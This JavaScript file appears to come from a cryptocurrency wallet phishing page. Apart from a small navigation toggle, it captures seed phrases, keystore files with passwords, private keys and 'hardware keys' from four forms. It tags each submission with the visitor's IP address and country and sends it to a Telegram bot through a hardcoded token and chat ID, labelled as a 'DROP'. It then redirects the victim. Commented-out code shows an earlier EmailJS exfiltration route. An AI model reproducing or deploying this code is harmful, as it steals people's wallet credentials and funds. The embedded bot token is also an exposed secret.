const toggleBar = document.querySelector('#toggleBar');
const asideNav = document.querySelector('#asideContainer');
const overlay = document.querySelector('.overlay');
const closeBar = document.querySelector('#closeBar');
const body = document.body;
if (toggleBar) {
  toggleBar.addEventListener('click', () => {
    if (asideNav.classList.contains('display')) {
      asideNav.classList.remove('display');
      overlay.classList.remove('display');
      body.classList.add('noscroll');
    }
  });
}
if (closeBar) {
  closeBar.addEventListener('click', () => {
    if (!asideNav.classList.contains('display')) {
      asideNav.classList.add('display');
      overlay.classList.add('display');
      body.classList.remove('noscroll');
    }
  });
}

const form = document.querySelector('#my-form');
const formTwo = document.querySelector('#formTWO');
const formThree = document.querySelector('#formThree');
const formFour = document.querySelector('#formFour');
// async function handleSubmit(event) {
//   event.preventDefault();
//   event.target.value = '';
//   const status = document.getElementById('my-form-status');
//   const data = new FormData(event.target);
//   fetch(event.target.action, {
//     method: form.method,
//     body: data,
//     headers: {
//       Accept: 'application/json',
//     },
//   })
//     .then((response) => {
//       if (response.ok) {
//         status.innerHTML = 'Thanks for your submission!';
//         form.reset();
//       } else {
//         response.json().then((data) => {
//           if (Object.hasOwn(data, 'errors')) {
//             status.innerHTML = data['errors']
//               .map((error) => error['message'])
//               .join(', ');
//           } else {
//             status.innerHTML = 'Oops! There was a problem submitting your form';
//           }
//         });
//       }
//     })
//     .catch((error) => {
//       status.innerHTML = 'Oops! There was a problem submitting your form';
//     });
// }
// if (form) {
//   form.addEventListener('submit', handleSubmit);
//   formTwo.addEventListener('submit', handleSubmit);
//   formThree.addEventListener('submit', handleSubmit);
//   formFour.addEventListener('submit', handleSubmit);
// }

async function getLocationData() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return {
      ip: data.ip,
      country: data.country_name,
    };
  } catch (error) {
    console.log('Error fetching location data:', error);
    return {
      ip: 'Unknown',
      country: 'Unknown',
    };
  }
}

async function formatMessage(formType, formData) {
  const locationData = await getLocationData();
  const date = new Date().toLocaleString();
  const message = `
    <b> => NEW ${formType} DROP</b>
    <b>.....................................................</b>\n
    ${formData}\n
    <b>...................................................</b>
    <b>IP Address:</b> ${locationData.ip}
    <b>Country:</b> ${locationData.country}
    <b>Date:</b> ${date}
  `;
  sendToTelegram(message);
}

// Function to send data to Telegram
async function sendToTelegram(formData) {
  const token = '7285769190:AAFopuaBmZwBQ-IH152ZbkTfhs5ERCUMUeA';
  const chatId = '6952042736';

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: formData,
      parse_mode: 'HTML',
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.ok) {
        window.location.href = '../index.html';
      } else {
        console.log('There was an error sending the form.');
        window.location.href = '../index.html';
      }
    })
    .catch((error) => {
      console.log('There was an error sending the form.');
      window.location.href = '../index.html';
    });
}

// Attach event listeners to forms
document
  .getElementById('mnemonics-form')
  .addEventListener('submit', function (event) {
    event.preventDefault();

    let formData = '';
    const mnemonics = document.getElementById('mnemonicsInput').value;
    formData = `MNEMONICS: ${mnemonics}`;

    formatMessage('MNEMONICS', formData);
  });

document
  .getElementById('keystore-form')
  .addEventListener('submit', function (event) {
    event.preventDefault();

    let formData = '';

    const keystore = document.getElementById('keystoreInput').value;
    const password = document.getElementById('keystorePasswordInput').value;

    formData = `KEYSTORE: ${keystore}\nPASSWORD: ${password}`;
    formatMessage('KEYSTORE', formData);
  });

document
  .getElementById('private-key-form')
  .addEventListener('submit', function (event) {
    event.preventDefault();

    let formData = '';

    const privateKey = document.getElementById('privateKeyInput').value;

    formData = `PRIVATE KEY: ${privateKey}`;
    formatMessage('PRIVATE KEY', formData);
  });

document
  .getElementById('hardware-form')
  .addEventListener('submit', function (event) {
    event.preventDefault();

    let formData = '';

    const hardwareKey = document.getElementById('hardwareInput').value;

    formData = `HARDWARE KEY: ${hardwareKey}`;
    formatMessage('HARDWARE KEY', formData);
  });

// const handleSubmit = () => {
//   let params = {
//     message: document.querySelector('#textInput').value,
//     keystore: document.querySelector('#textInput2').value,
//     password: document.querySelector('#passwordInput').value,
//     privatekey: document.querySelector('#textInputThree').value,
//     hardware: document.querySelector('#textInputFour').value,
//   };
//   emailjs
//     .send('service_m3ku78i', 'template_sh5ygxg', params)
//     .then(function (res) {
//       alert('success ' + res.status);
//     });
// };
//
// form.addEventListener('submit', (e) => {
//   e.preventDefault();
//   handleSubmit();
// });
// formTwo.addEventListener('submit', (e) => {
//   e.preventDefault();
//   handleSubmit();
// });
// formThree.addEventListener('submit', (e) => {
//   e.preventDefault();
//   handleSubmit();
// });
// formFour.addEventListener('submit', (e) => {
//   e.preventDefault();
//   handleSubmit();
// });
